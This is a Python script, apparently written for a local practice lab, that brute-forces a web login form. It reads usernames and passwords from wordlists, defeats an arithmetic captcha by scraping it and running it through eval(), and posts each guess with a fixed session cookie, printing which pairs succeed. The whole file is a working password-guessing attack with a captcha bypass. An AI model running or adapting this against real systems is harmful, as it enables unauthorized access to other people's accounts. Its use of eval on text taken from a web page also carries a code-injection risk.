import requests
import re

url = "http://localhost/bruteforce3/index.php"
cookies = {'PHPSESSID': '6i3lpc760hvs77d6vhhn3vq1tb'}
data= {"username": "", "password": "", "captcha": ""}

rg_err = re.compile(r'<p style="color:red" >.*</p>')
rg_calc = re.compile(r'\d+\s+[\+-x]\s+\d+')

with open("users.txt") as users:
    while user := users.readline():
        with open("passwords.txt") as passwords:
            while password := passwords.readline():

                req = requests.get(url, cookies=cookies)

                html = req.text

                calc = rg_calc.findall(html)[0].replace('x', '*')

                res = str(eval(calc))
 
                data["username"] = user.strip()
                data["password"] = password.strip()
                data["captcha"] = res

                post_response = requests.post(url=url, cookies=cookies, data=data)

                if(post_response.history):
                    res_post = "Sucesso"
                else:
                    res_post = rg_err.findall(post_response.text)[0].replace('<p style="color:red" >', '').replace('</p>', '')

                print(data["username"] + " - " + data["password"] + " - " + res_post)